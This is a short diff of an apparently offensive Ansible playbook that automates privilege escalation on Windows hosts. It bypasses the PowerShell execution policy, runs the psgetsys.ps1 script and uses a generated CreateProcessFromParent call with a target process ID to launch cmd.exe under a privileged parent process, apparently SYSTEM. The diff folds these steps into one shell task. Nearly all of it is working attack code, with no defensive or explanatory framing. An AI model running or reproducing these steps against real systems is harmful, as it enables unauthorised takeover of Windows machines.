@@ -21,20 +21,8 @@
       tags: always
       win_shell: |
         Set-ExecutionPolicy Bypass -scope Process -Force ; cd c:\temp ; .\psgetsys.ps1
-      register: result2
-    - debug: msg="{{ result2.stdout }}"
-      tags: always
-    - name: Inject and check if running as system
-      tags: always
-      win_shell: |
         echo '[MyProcess]::CreateProcessFromParent({{pid}} ,"cmd.exe")' > c:\temp\priv-temp.ps1
-    - name: Remove carriage return from file
-      tags: always
-      win_shell: |
         (Get-Content c:\temp\priv-temp.ps1) -join ' ' > c:\temp\priv.ps1
-    - name: Execute ps script
-      tags: always
-      win_shell: |
         Set-ExecutionPolicy Bypass -scope Process -Force ; cd c:\temp ; .\priv.ps1
       register: result
     - debug: msg="{{ result.stdout }}"
